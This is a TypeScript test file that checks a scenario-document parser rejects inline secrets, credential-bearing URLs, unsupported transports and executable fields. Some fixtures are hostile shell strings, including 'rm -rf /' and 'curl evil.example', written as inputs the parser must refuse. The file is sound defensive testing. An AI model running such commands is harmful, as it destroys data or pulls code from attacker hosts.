/**
 * Parity tests for `parseScenarioDocument` — ported case-for-case from
 * `runtime-go`'s `scenario/validate_test.go` and `scenario/parse_security_test.go`.
 * Every `it()` here has a named Go counterpart (noted in its title) so a
 * reviewer can check both suites side by side; each asserts the same
 * accept/reject outcome, the same rule `code`, and — for the security rules
 * — that no issue message ever echoes the offending secret/credential value.
 *
 * Two rules are deliberately **not** ported unmodified, because
 * `runtime-ts`'s bot-transport support is the declared mirror image of
 * `runtime-go`'s (see `document-validate.ts`'s module doc comment):
 * `TestParse_IframeTransportIsRefusedByName` becomes
 * "http transport is refused by name" here, and
 * `TestParse_HTTPWebhookTransportIsAccepted` becomes "iframe transport is
 * accepted". The credential-bearing-URL tests use `transport: "iframe"`
 * (not Go's `http`+`webhook`) so the "clean URL is accepted" case is
 * actually reachable in this runtime — the scan itself runs identically
 * regardless of which transport is named.
 */

import { describe, expect, it } from "vitest";
import { parseScenarioDocument } from "./document-parse.js";
import { resolveFidelity } from "./document-fidelity.js";
import type { Report } from "./issues.js";
import type { Document } from "./document.js";

/** A minimal, otherwise-valid document string each test mutates one field of — mirrors Go's `validBaseDocument`. */
const VALID_BASE_DOCUMENT = `{
  "format": "https://chatwright.dev/formats/scenario-document/v1",
  "schemaVersion": 1,
  "id": "t",
  "version": "v1",
  "title": "t",
  "requires": ["ai-goal", "exampleBot:greetbot"],
  "fidelity": {"endpointProfile": "platform-emulated", "environment": "dev", "dataSensitivity": "synthetic"},
  "platform": "telegram",
  "chats": [{"id": "main", "platformChatId": 42}],
  "bot": {"id": "b", "name": "B", "exampleBot": "greetbot"},
  "cast": [
    {
      "id": "arena", "type": "ai-agent", "name": "Arena",
      "platformIdentity": {"userId": 7, "firstName": "Arena"},
      "provider": {"kind": "cassette", "mode": "replay", "cassette": "c.json"}
    }
  ],
  "parts": [
    {
      "id": "p1", "kind": "ai-goal", "chat": "main", "actorId": "arena",
      "goal": {
        "id": "g1", "title": "g",
        "tasks": [{"id": "t1", "successCriteria": "sc"}],
        "budgets": {"maxSteps": 5}
      }
    }
  ]
}`;

function mustErrorCode(report: Report, wantCode: string) {
  const issue = report.issues.find((i) => i.severity === "error" && i.code === wantCode);
  if (issue === undefined) {
    throw new Error(`no error-severity issue with code ${JSON.stringify(wantCode)} found; errors = ${JSON.stringify(report.issues.filter((i) => i.severity === "error"), null, 2)}`);
  }
  return issue;
}

function accept(text: string): Document {
  const { document, report, error } = parseScenarioDocument(text);
  if (document === undefined) {
    throw new Error(`parseScenarioDocument() rejected, want acceptance; error=${error}\nreport=${JSON.stringify(report, null, 2)}`);
  }
  return document;
}

function reject(text: string): Report {
  const { document, report, error } = parseScenarioDocument(text);
  expect(document, "parseScenarioDocument() returned a document for a document that should have been rejected").toBeUndefined();
  expect(error, "parseScenarioDocument() returned no error for a rejected document").toBeDefined();
  return report;
}

// --- AC: inline-secret-is-rejected (Go: TestParse_InlineSecretIsRejected) ---

describe("inline-secret-is-rejected", () => {
  it("rejects a literal apiKey with code inline-secret, never echoing the value", () => {
    const doc = VALID_BASE_DOCUMENT.replace(
      '"provider": {"kind": "cassette", "mode": "replay", "cassette": "c.json"}',
      '"provider": {"kind": "model", "providerId": "openai", "model": "gpt-x", "apiKey": "sk-live-THIS-IS-A-SECRET"}',
    );
    const report = reject(doc);
    const issue = mustErrorCode(report, "inline-secret");
    expect(issue.pointer).toBe("/cast/0/provider/apiKey");
    expect(issue.message).not.toContain("sk-live-THIS-IS-A-SECRET");
    expect(JSON.stringify(report)).not.toContain("sk-live-THIS-IS-A-SECRET");
  });
});

// --- Go: TestParse_SecretRefShapeViolationsAreRejected ---

describe("secretRef shape violations are rejected", () => {
  it("rejects a secretRef carrying a sibling default", () => {
    const doc = VALID_BASE_DOCUMENT.replace(
      '"provider": {"kind": "cassette", "mode": "replay", "cassette": "c.json"}',
      '"provider": {"kind": "model", "providerId": "openai", "model": "gpt-x", "apiKey": {"secretRef": "k", "default": "fallback-secret"}}',
    );
    const report = reject(doc);
    const issue = mustErrorCode(report, "secret-ref-shape");
    expect(issue.pointer).toBe("/cast/0/provider/apiKey");
  });

  it("rejects a secretRef naming an undeclared secret", () => {
    const doc = VALID_BASE_DOCUMENT.replace(
      '"provider": {"kind": "cassette", "mode": "replay", "cassette": "c.json"}',
      '"provider": {"kind": "model", "providerId": "openai", "model": "gpt-x", "apiKey": {"secretRef": "never-declared"}}',
    );
    const report = reject(doc);
    mustErrorCode(report, "secret-ref-undeclared");
  });
});

// --- AC: credential-bearing-url-is-rejected (Go: TestParse_CredentialBearingURLIsRejected) ---
//
// Uses transport:"iframe" (runtime-ts's supported transport), not Go's
// http+webhook, so the "clean URL is accepted" case is reachable here — see
// this file's module doc comment.

describe("credential-bearing-url-is-rejected", () => {
  const base = VALID_BASE_DOCUMENT.replace('"exampleBot": "greetbot"', '"transport": "iframe", "url": "URLPLACEHOLDER"').replace(
    '"requires": ["ai-goal", "exampleBot:greetbot"],',
    '"requires": ["ai-goal"],',
  );

  it("rejects userinfo, never echoing the credential", () => {
    const doc = base.replace("URLPLACEHOLDER", "https://user:CorrectHorseBattery@bot.example.com/webhook");
    const report = reject(doc);
    const issue = mustErrorCode(report, "credential-bearing-url");
    expect(issue.pointer).toBe("/bot/url");
    expect(issue.message).not.toContain("CorrectHorseBattery");
  });

  it("rejects a token query parameter, never echoing the credential", () => {
    const doc = base.replace("URLPLACEHOLDER", "https://bot.example.com/webhook?token=abc123SECRET");
    const report = reject(doc);
    const issue = mustErrorCode(report, "credential-bearing-url");
    expect(issue.message).not.toContain("abc123SECRET");
  });

  it("rejects an api_key query parameter (underscore/case variant)", () => {
    const doc = base.replace("URLPLACEHOLDER", "https://bot.example.com/webhook?api_key=abc123SECRET");
    const report = reject(doc);
    mustErrorCode(report, "credential-bearing-url");
  });

  it("accepts a plain URL with no credentials", () => {
    const doc = base.replace("URLPLACEHOLDER", "https://bot.example.com/webhook");
    accept(doc);
  });
});

// --- AC: executable-string-members-are-rejected (Go: TestParse_ExecutableStringMembersAreRejected) ---

describe("executable-string-members-are-rejected", () => {
  const cases: { name: string; mutate: (doc: string) => string }[] = [
    { name: "command at document root", mutate: (doc) => doc.replace('"format":', '"command": "rm -rf /", "format":') },
    { name: "script nested in bot", mutate: (doc) => doc.replace('"exampleBot": "greetbot"', '"exampleBot": "greetbot", "script": "curl evil.example"') },
    { name: "shell nested in goal", mutate: (doc) => doc.replace('"title": "g",', '"title": "g", "shell": "/bin/sh",') },
    { name: "entrypoint nested in a task", mutate: (doc) => doc.replace('"successCriteria": "sc"', '"successCriteria": "sc", "entrypoint": "main.sh"') },
  ];
  for (const { name, mutate } of cases) {
    it(name, () => {
      const report = reject(mutate(VALID_BASE_DOCUMENT));
      mustErrorCode(report, "executable-string-member");
    });
  }
});

// --- AC: ai-goal-part-without-budgets-is-rejected (Go: TestParse_AIGoalPartWithoutBudgetsIsRejected) ---

describe("ai-goal-part-without-budgets-is-rejected", () => {
  it("rejects absent budgets", () => {
    const doc = VALID_BASE_DOCUMENT.replace('"budgets": {"maxSteps": 5}', '"budgets": {}');
    const report = reject(doc);
    const issue = mustErrorCode(report, "ai-goal-budgets-required");
    expect(issue.pointer).toBe("/parts/0/goal/budgets");
  });

  it("rejects every bound zero", () => {
    const doc = VALID_BASE_DOCUMENT.replace('"budgets": {"maxSteps": 5}', '"budgets": {"maxSteps": 0, "maxDurationSeconds": 0}');
    const report = reject(doc);
    mustErrorCode(report, "ai-goal-budgets-required");
  });

  it.each(['{"maxSteps": 1}', '{"maxDurationSeconds": 1}', '{"maxCost": 0.01}'])("accepts one positive bound: %s", (budgets) => {
    const doc = VALID_BASE_DOCUMENT.replace('"budgets": {"maxSteps": 5}', `"budgets": ${budgets}`);
    accept(doc);
  });
});

// --- AC: parsing-resolves-nothing-and-starts-nothing (Go: TestParse_ResolvesNothingAndStartsNothing) ---

describe("parsing-resolves-nothing-and-starts-nothing", () => {
  it("accepts a document declaring env/credential secrets, an exampleBot, an http url and a cassette path, none of which exist/resolve", () => {
    // parseScenarioDocument's signature takes only document text — it has no
    // SecretResolver, no filesystem access and no network client, so there
    // is no code path inside it that could read an env var, consult a
    // credential store, start a bot or read a cassette file. This mirrors
    // Go's proof: acceptance itself (rather than a file-not-found/DNS/
    // credential-store error) is the evidence that nothing was resolved.
    const doc = `{
  "format": "https://chatwright.dev/formats/scenario-document/v1",
  "schemaVersion": 1,
  "id": "t", "version": "v1", "title": "t",
  "requires": ["ai-goal"],
  "fidelity": {"endpointProfile": "platform-emulated", "environment": "dev", "dataSensitivity": "synthetic"},
  "platform": "telegram",
  "chats": [{"id": "main", "platformChatId": 42}],
  "bot": {"id": "b", "name": "B", "transport": "iframe", "url": "https://nonexistent.invalid.example/embed"},
  "secrets": [
    {"name": "authHeader", "from": {"env": "CHATWRIGHT_TEST_NEVER_SET_XYZ"}},
    {"name": "credSecret", "from": {"credential": "never-looked-up"}}
  ],
  "cast": [
    {
      "id": "arena", "type": "ai-agent", "name": "Arena",
      "platformIdentity": {"userId": 7, "firstName": "Arena"},
      "provider": {"kind": "cassette", "mode": "replay", "cassette": "does/not/exist/on/disk.json"}
    }
  ],
  "parts": [
    {
      "id": "p1", "kind": "ai-goal", "chat": "main", "actorId": "arena",
      "goal": {"id": "g1", "title": "g", "tasks": [{"id": "t1", "successCriteria": "sc"}], "budgets": {"maxSteps": 5}}
    }
  ]
}`;
    const document = accept(doc);
    expect(document.secrets).toBeDefined();
    const { report } = parseScenarioDocument(doc);
    expect(report.issues.some((i) => i.severity === "warning")).toBe(true); // sanity: noRunCeiling/noIndependentVerification still ran.
  });
});

// --- AC: unsupported-capability-is-named-not-dropped (Go: TestParse_UnsupportedCapabilityIsNamedNotDropped) ---

describe("unsupported-capability-is-named-not-dropped", () => {
  it("names deterministic-steps for a deterministic part", () => {
    let doc = VALID_BASE_DOCUMENT.replace(
      '"requires": ["ai-goal", "exampleBot:greetbot"],',
      '"requires": ["ai-goal", "exampleBot:greetbot", "deterministic"],',
    );
    doc = doc.replace(
      '"id": "p1", "kind": "ai-goal", "chat": "main", "actorId": "arena",',
      '"id": "p1", "kind": "deterministic", "chat": "main", "actorId": "arena", "steps": [],',
    );
    const report = reject(doc);
    const named = report.issues.some((i) => i.severity === "error" && i.code === "unsupported-capability" && i.message.includes("deterministic-steps"));
    expect(named).toBe(true);
  });

  it("names multi-chat for two declared chats", () => {
    const doc = VALID_BASE_DOCUMENT.replace(
      '"chats": [{"id": "main", "platformChatId": 42}],',
      '"chats": [{"id": "main", "platformChatId": 42}, {"id": "second", "platformChatId": 43}],',
    );
    const report = reject(doc);
    const issue = mustErrorCode(report, "unsupported-capability");
    expect(issue.message).toContain("multi-chat");
  });

  it("names an unrecognised requires entry", () => {
    const doc = VALID_BASE_DOCUMENT.replace('"requires": ["ai-goal", "exampleBot:greetbot"],', '"requires": ["ai-goal", "exampleBot:greetbot", "hybrid"],');
    const report = reject(doc);
    const issue = mustErrorCode(report, "unsupported-capability");
    expect(issue.message).toContain('"hybrid"');
  });

  it("rejects an unrecognised schema version", () => {
    const doc = VALID_BASE_DOCUMENT.replace('"schemaVersion": 1,', '"schemaVersion": 2,');
    const report = reject(doc);
    mustErrorCode(report, "unsupported-schema-version");
  });

  it("rejects an unrecognised format", () => {
    const doc = VALID_BASE_DOCUMENT.replace(
      '"format": "https://chatwright.dev/formats/scenario-document/v1",',
      '"format": "https://chatwright.dev/formats/scenario-document/v99",',
    );
    const report = reject(doc);
    mustErrorCode(report, "unsupported-format");
  });
});

// --- AC: unsupported-transport-is-refused-by-name — runtime-ts half ---
//
// The mirror image of Go's TestParse_IframeTransportIsRefusedByName /
// TestParse_HTTPWebhookTransportIsAccepted: runtime-ts refuses "http" (no
// inbound HTTP server surface) and accepts "iframe".

describe("unsupported-transport-is-refused-by-name (runtime-ts half: http)", () => {
  it("rejects transport: http naming it explicitly", () => {
    let doc = VALID_BASE_DOCUMENT.replace('"exampleBot": "greetbot"', '"transport": "http", "delivery": "webhook", "url": "https://bot.example.com/webhook"');
    doc = doc.replace('"requires": ["ai-goal", "exampleBot:greetbot"],', '"requires": ["ai-goal"],');
    const report = reject(doc);
    const issue = mustErrorCode(report, "unsupported-transport");
    expect(issue.message).toContain("http");
  });
});

describe("a valid iframe-transport document is accepted (the transport runtime-ts DOES support)", () => {
  it("accepts transport: iframe", () => {
    let doc = VALID_BASE_DOCUMENT.replace('"exampleBot": "greetbot"', '"transport": "iframe", "url": "https://bot.example.com/embed"');
    doc = doc.replace('"requires": ["ai-goal", "exampleBot:greetbot"],', '"requires": ["ai-goal"],');
    accept(doc);
  });
});

// --- AC: environment-is-declared-and-never-guessed (Go: TestResolveFidelity_EnvironmentNeverGuessed) ---

describe("environment-is-declared-and-never-guessed", () => {
  const minimalDoc = (overrides: Partial<Document>): Document => ({
    format: "https://chatwright.dev/formats/scenario-document/v1",
    schemaVersion: 1,
    id: "t",
    version: "v1",
    title: "t",
    fidelity: { endpointProfile: "platform-emulated" },
    platform: "telegram",
    chats: [],
    bot: { id: "b", name: "B" },
    cast: [],
    parts: [],
    ...overrides,
  });

  it("resolves an unrecognised host to unknown, never dev or production", () => {
    const doc = minimalDoc({ bot: { id: "b", name: "B", url: "https://real-bot.example.com/webhook" } });
    expect(resolveFidelity(doc).environment).toBe("unknown");
  });

  it("resolves localhost to dev", () => {
    const doc = minimalDoc({ bot: { id: "b", name: "B", url: "http://localhost:8080/webhook" } });
    expect(resolveFidelity(doc).environment).toBe("dev");
  });

  it("lets a declared environment win over the heuristic", () => {
    const doc = minimalDoc({
      bot: { id: "b", name: "B", url: "http://localhost:8080/webhook" },
      fidelity: { endpointProfile: "platform-emulated", environment: "production" },
    });
    expect(resolveFidelity(doc).environment).toBe("production");
  });

  it("defaults sensitivity to real-subject in production", () => {
    const doc = minimalDoc({ fidelity: { endpointProfile: "platform-emulated", environment: "production" } });
    expect(resolveFidelity(doc).dataSensitivity).toBe("real-subject");
  });

  it("keeps a real-subject declaration on a test endpoint, never downgrading it", () => {
    const doc = minimalDoc({ fidelity: { endpointProfile: "platform-emulated", environment: "test", dataSensitivity: "real-subject" } });
    expect(resolveFidelity(doc).dataSensitivity).toBe("real-subject");
  });

  it("defaults sensitivity to synthetic outside production", () => {
    const doc = minimalDoc({ fidelity: { endpointProfile: "platform-emulated", environment: "dev" } });
    expect(resolveFidelity(doc).dataSensitivity).toBe("synthetic");
  });
});

describe("real-subject without a redaction policy is rejected", () => {
  it("rejects, then accepts once redactionPolicy is declared", () => {
    const doc = VALID_BASE_DOCUMENT.replace(
      '"fidelity": {"endpointProfile": "platform-emulated", "environment": "dev", "dataSensitivity": "synthetic"},',
      '"fidelity": {"endpointProfile": "platform-emulated", "environment": "test", "dataSensitivity": "real-subject"},',
    );
    const report = reject(doc);
    mustErrorCode(report, "redaction-policy-required");

    const docWithPolicy = doc.replace('"dataSensitivity": "real-subject"},', '"dataSensitivity": "real-subject", "redactionPolicy": "standard-pii-v1"},');
    accept(docWithPolicy);
  });
});

// --- noRunCeiling / noIndependentVerification are warnings, never errors (Go: TestParse_AbsentCeilingAndVerifyAreWarningsNotErrors) ---

describe("absent ceiling and verify are warnings, not errors", () => {
  it("accepts the base document and reports both warnings", () => {
    const { report } = parseScenarioDocument(VALID_BASE_DOCUMENT);
    const codes = report.issues.filter((i) => i.severity === "warning").map((i) => i.code);
    expect(codes).toContain("no-run-ceiling");
    expect(codes).toContain("no-independent-verification");
  });
});

// --- Go: TestParse_UnknownMemberIsRejected ---

describe("an unrecognised member is rejected", () => {
  it("names the unrecognised member", () => {
    const doc = VALID_BASE_DOCUMENT.replace('"title": "t",', '"title": "t", "titel": "typo",');
    const report = reject(doc);
    const issue = mustErrorCode(report, "unknown-member");
    expect(issue.message).toContain('"titel"');
  });
});

// --- Go: TestParse_VerifyConditionValueShapeIsChecked ---

describe("verify condition value shape is checked", () => {
  function withVerify(condition: string): string {
    const doc = VALID_BASE_DOCUMENT.replace(/\n}$/, "");
    return (
      doc +
      `,
  "verify": {"chat": "main", "metDetail": "ok", "journal": [
    {"id": "e1", "unmetDetail": "no", "all": [${condition}]}
  ]}
}`
    );
  }

  it("rejects a numeric exact value", () => {
    const report = reject(withVerify('{"field": "text", "op": "exact", "value": 42}'));
    mustErrorCode(report, "invalid-shape");
  });

  it('rejects a string value on the boolean "edited" field', () => {
    const report = reject(withVerify('{"field": "edited", "op": "exact", "value": "true"}'));
    mustErrorCode(report, "invalid-shape");
  });

  it("accepts a string-array exact value", () => {
    accept(withVerify('{"field": "text", "op": "exact", "value": ["a", "b"]}'));
  });
});
